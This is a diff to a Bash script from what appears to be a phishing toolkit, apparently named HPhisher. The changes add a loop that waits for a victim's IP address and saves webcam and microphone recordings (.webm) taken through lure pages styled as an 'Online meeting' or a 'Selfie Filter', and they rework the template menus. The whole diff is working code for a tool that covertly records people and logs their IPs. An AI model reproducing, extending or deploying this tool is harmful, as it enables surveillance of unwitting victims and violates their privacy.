@@ -462,13 +462,13 @@ setup_site() {
 
 #Capture data check
 capture_data_check(){
-	if [ ${type} == "video" ];then
-                capture_data_video
-        elif [ ${type} == "audio" ];then
+	if [ -f .server/www/AUDIO ];then
                 capture_data_audio
-        elif [ ${type} == "image" ];then
+        elif [ -f .server/www/IMAGE ];then
                 capture_data_image
-	elif [ ${type} == "both" ];then
+        elif [ -f .server/www/VIDEO ];then
+                capture_data_video
+	elif [ -f .server/www/VIDAUD ];then
                capture_data_video_audio
 	else
 	    	echo " Error Occured!!"
@@ -641,6 +641,32 @@ capture_data_video() {
 	done
 }
 
+capture_data_video_audio() {
+        echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+  while true; do
+                if [[ -e ".server/www/ip.txt" ]]; then
+                        echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+                        capture_ip
+                        rm -rf .server/www/ip.txt
+                fi
+                sleep 0.75
+		if [[ -e ".server/www/Log.log" ]]; then
+                        printf "${GREEN} Video and Audio file received! ${NC}"
+			echo -ne "\n${BLUE} Saved in : ${GREEN} ${logs_full_dir}"
+			echo -ne " "
+                        rm -rf Log.log
+			if [ -d ${logs_full_dir} ]; then
+                                mv .server/www/*.webm  ${logs_full_dir}/
+                        else
+                                mkdir ${logs_dir}
+                                mv ${logs_dir} ${files_dir}/${site_name}/
+                                mv .server/www/*.webm  "${logs_full_dir}/Video-${logs_dir}.webm"
+                        fi
+                fi
+                sleep 0.5
+	done
+}
+
 mainmenu() {
 echo -e " "
 echo -e " "
@@ -682,7 +708,7 @@ case $reply_site in
 	4 | 04)
 		duration=5000
 		type="both"
-		site_name=video
+		site_name=video_audio
 		site_video_audio;;
 	A | a)
 		xdg-open https://github.com/HPhisher/NPhisher
@@ -832,34 +858,22 @@ banner
 echo -e " "
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
-echo -e "${BLUE}[01]${CYAN} Default ${NC}"
-echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
-echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
-echo -e "${BLUE}[d]${RED} Change duration (Current=${duration}) ${NC}"
+echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
+echo -e "${BLUE}[02]${CYAN} Selfie Filter ${NC}"
 echo -e " "
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
 case $reply_template in
-        1 | 01)
-                site_template="default"
-                tunnel_menu;;
-	2 | 02)
+	1 | 01)
 		site_template="onlinemeet"
                 tunnel_menu;;
-	3 | 03)
+	2 | 02)
 		site_template="filter"
 		tunnel_menu;;
-	d | D)
-		echo -e " "
-		echo -e "	${GREEN}Type your video duration : ${BLUE}"
-		read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
-		site_video;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                 { sleep 1; banner; site_video; };;
 esac
-cd ".sites/video/${site_template}/"
 sed "s+mediaType+"video"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
-cd "${pro_dir}"
 }
 
 site_video_audio(){
@@ -868,36 +882,23 @@ echo -e " "
 echo -e " "
 banner
 echo -e " "
-duration=5000
 echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Select template : ${BLUE}"
 echo -e " "
-echo -e "${BLUE}[01]${CYAN} Default ${NC}"
-echo -e "${BLUE}[02]${CYAN} Online meeting ${NC}"
-echo -e "${BLUE}[03]${CYAN} Selfie Filter ${NC}"
-echo -e "${BLUE}[d]${RED} Change duration (default=${duration}) ${NC}"
+echo -e "${BLUE}[01]${CYAN} Online meeting ${NC}"
+echo -e "${BLUE}[02]${CYAN} Selfie Filter ${NC}"
 echo -e " "
 read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" reply_template
 case $reply_template in
-        1 | 01)
-                site_template="default"
-                tunnel_menu;;
-	2 | 02)
+	1 | 01)
 		site_template="onlinemeet"
                 tunnel_menu;;
-	3 | 03)
+	2 | 02)
 		site_template="filter"
 		tunnel_menu;;
-	d | D)
-		echo -e " ${RED}[${WHITE}-${RED}]${GREEN}Type your video duration : ${BLUE}"
-		read -p "${RED}[${WHITE}-${RED}]${GREEN}HPhisher/${site_name}/ : ${BLUE}" duration
-		site_video_audio;;
         *)
                 echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-                { sleep 1; banner; site_video; };;
+                { sleep 1; banner; site_video_audio; };;
 esac
-cd ${sites_dir}/video/${site_template}/
-sed "s+mediaType+"both"+g" template.js | sed "s+recordingTime+"$duration"+g" > recorder.js
-cd ${pro_dir}
 }
 
 clear
